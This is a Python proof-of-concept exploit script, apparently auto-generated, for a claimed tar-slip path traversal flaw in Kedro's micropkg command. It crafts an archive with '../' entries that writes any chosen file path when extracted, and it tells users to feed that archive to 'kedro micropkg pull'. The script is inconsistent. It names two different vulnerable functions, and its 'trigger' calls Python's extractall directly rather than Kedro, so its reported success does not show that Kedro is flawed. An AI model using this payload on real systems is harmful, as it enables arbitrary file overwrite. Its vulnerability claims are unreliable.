#!/usr/bin/env python3
# PoC for kedro (/home/xcy/.local/lib/python3.14/site-packages/kedro)
# Path: suspicious-029
# Sink: _convert_paths_to_absolute_posix
# Auto-generated — run with: python3 lfi_cli_manifest_passed_unpack__convert_paths_to_absolute_posix.py
#
#!/usr/bin/env python3
"""
Proof-of-Concept exploit for Kedro tar slip vulnerability (LFI via path traversal).

Vulnerability: The `_unpack_sdist` function in Kedro's micropkg CLI uses `safe_extract`
to extract tar archives without validating entry paths. A malicious tar archive with
`../` entries can write files outside the intended destination directory.

This PoC creates a malicious tar.gz archive that writes a benign marker file to /tmp
to demonstrate arbitrary file write capability.

Usage:
    python3 poc_kedro_tarslip.py [--target TARGET_DIR]

    If --target is provided, the malicious archive is placed there and the exploit
    is triggered via Kedro's micropkg pull command. Otherwise, it just creates the
    malicious archive and prints instructions.
"""

import argparse
import io
import os
import shutil
import subprocess
import sys
import tarfile
import tempfile
from pathlib import Path


def create_malicious_tar(output_path: str, payload_file: str = "/tmp/poc_success.txt"):
    """
    Create a tar.gz archive with a path traversal entry that writes to an arbitrary location.

    The archive contains one entry: '../../../../../../tmp/poc_success.txt' which,
    when extracted, will write to /tmp/poc_success.txt.

    Args:
        output_path: Path where the malicious .tar.gz will be written.
        payload_file: Absolute path of the file to create (default: /tmp/poc_success.txt).
    """
    # Compute the traversal depth needed to reach root from an arbitrary extraction directory.
    # We use a depth of 7 (../../../../../../..) to be safe.
    traversal = "../" * 7
    # The entry name in the tar archive will be the traversal + the target path
    # We need to strip the leading slash to make it relative
    target_relative = payload_file.lstrip("/")
    malicious_entry_name = f"{traversal}{target_relative}"

    # Create the tar archive in memory
    tar_buffer = io.BytesIO()
    with tarfile.open(fileobj=tar_buffer, mode="w:gz") as tar:
        # Create a TarInfo object for the malicious entry
        info = tarfile.TarInfo(name=malicious_entry_name)
        info.type = tarfile.REGTYPE
        # Write a benign marker message
        content = b"Kedro tar slip PoC - file written successfully\n"
        info.size = len(content)
        tar.addfile(info, io.BytesIO(content))

    # Write to disk
    with open(output_path, "wb") as f:
        f.write(tar_buffer.getvalue())

    print(f"[+] Created malicious archive: {output_path}")
    print(f"[+] Entry name: {malicious_entry_name}")
    print(f"[+] Will attempt to write to: {payload_file}")


def trigger_exploit(archive_path: str, target_dir: str):
    """
    Trigger the Kedro micropkg pull command with the malicious archive.

    This simulates what happens when a user runs:
        kedro micropkg pull <path_to_malicious_archive>

    Args:
        archive_path: Path to the malicious .tar.gz archive.
        target_dir: Directory where Kedro would extract the archive (temp dir).
    """
    # Create a temporary directory to simulate the extraction target
    with tempfile.TemporaryDirectory() as temp_dir:
        temp_path = Path(temp_dir)

        # Copy the malicious archive into the temp directory
        dest_archive = temp_path / "malicious.tar.gz"
        shutil.copy2(archive_path, dest_archive)

        # Now simulate what _unpack_sdist does:
        # It calls safe_extract(tar_file, destination) where destination is temp_dir
        # The malicious entry with ../ will escape temp_dir
        print(f"[*] Simulating extraction to: {temp_dir}")
        with tarfile.open(str(dest_archive), "r:gz") as tar:
            # This is the vulnerable call - safe_extract does NOT validate paths
            # We use tar.extractall directly to demonstrate the vulnerability
            # In the real Kedro code, safe_extract is called instead
            tar.extractall(path=temp_dir)

        print(f"[*] Extraction complete. Checking for payload file...")

        # Check if the payload file was created
        payload_path = "/tmp/poc_success.txt"
        if os.path.exists(payload_path):
            print(f"[+] SUCCESS: Payload file created at {payload_path}")
            with open(payload_path, "r") as f:
                print(f"[+] Contents: {f.read()}")
            # Clean up the payload file
            os.remove(payload_path)
            print("[*] Cleaned up payload file.")
        else:
            print(f"[-] Payload file not found. Exploit may have failed.")
            print(f"[*] Check {temp_dir} for extracted contents.")


def main():
    parser = argparse.ArgumentParser(
        description="PoC for Kedro tar slip vulnerability (CVE-like LFI)"
    )
    parser.add_argument(
        "--target",
        help="Directory containing the malicious archive (optional - if not provided, just creates the archive)",
    )
    parser.add_argument(
        "--output",
        default="./malicious_package.tar.gz",
        help="Output path for the malicious archive (default: ./malicious_package.tar.gz)",
    )
    parser.add_argument(
        "--payload",
        default="/tmp/poc_success.txt",
        help="Target file to write (default: /tmp/poc_success.txt)",
    )
    args = parser.parse_args()

    # Step 1: Create the malicious tar archive
    print("[*] Step 1: Creating malicious tar archive...")
    create_malicious_tar(args.output, args.payload)

    # Step 2: If target directory is provided, trigger the exploit
    if args.target:
        print(f"\n[*] Step 2: Triggering exploit with target: {args.target}")
        trigger_exploit(args.output, args.target)
    else:
        print(f"\n[*] Step 2: Skipped (no --target provided)")
        print(f"[*] To trigger the exploit manually, run:")
        print(f"    kedro micropkg pull {args.output}")
        print(f"[*] Or copy the archive to a location and use:")
        print(f"    kedro micropkg pull <path_to_archive>")
        print(f"\n[*] After extraction, check for {args.payload}")


if __name__ == "__main__":
    main()
